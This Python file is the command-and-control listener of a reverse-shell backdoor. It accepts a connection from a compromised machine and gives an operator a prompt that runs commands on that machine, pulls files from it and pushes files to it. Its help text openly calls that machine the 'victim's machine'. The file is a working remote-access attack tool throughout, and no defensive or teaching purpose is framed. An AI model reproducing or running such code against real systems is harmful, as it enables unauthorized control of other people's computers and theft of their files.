import socket
from termcolor import colored
import json
import base64

sock_object =  socket.socket(socket.AF_INET ,socket.SOCK_STREAM)

def generate_socket_and_listen():
    global ip
    global target
    ##create socket object

    sock_object.setsockopt(socket.SOL_SOCKET ,socket.SO_REUSEADDR ,1)

    ##bind local ip to port 
    sock_object.bind(("127.0.0.1" ,54320))

    ##listen for incoming connections
    sock_object.listen(5)

    print(colored("[+] Listening for incoming connections" ,"green"))

    target ,ip = sock_object.accept()
    print(colored("[+] connection established from %s"%str(ip) ,"green"))

    #sock_object.close()

def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def recv_over_json():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue

def shell():
    help_list = ["download\t-> download files from victim's machine" ,
                 "upload\t-> upload files to victim's machine" ,
                 "get\t-> download files from the internet to victim's machine" ,
                 "start\t-> start other applications on victim's machine"]
    while True:
        command = input(colored("* shell#~%s"%str(ip) ,"red"))
        if command ==  "help":
            for x in help_list:
                print(colored("\t\t->" + x,"yellow"))
            continue
        send_over_json(command)
        if command == 'q':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:8] == 'download':
            with open(command[9:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            try:
                with open(command[7:] ,'rb') as file:
                    send_over_json(base64.b64encode(file.read()))
            except:
                failed = "Failed to upload"
                send_over_json(base64.b64encode(failed))

        else:
            message = recv_over_json()
            print(colored(message,"blue"))
        



generate_socket_and_listen()
shell()

sock_object.close()
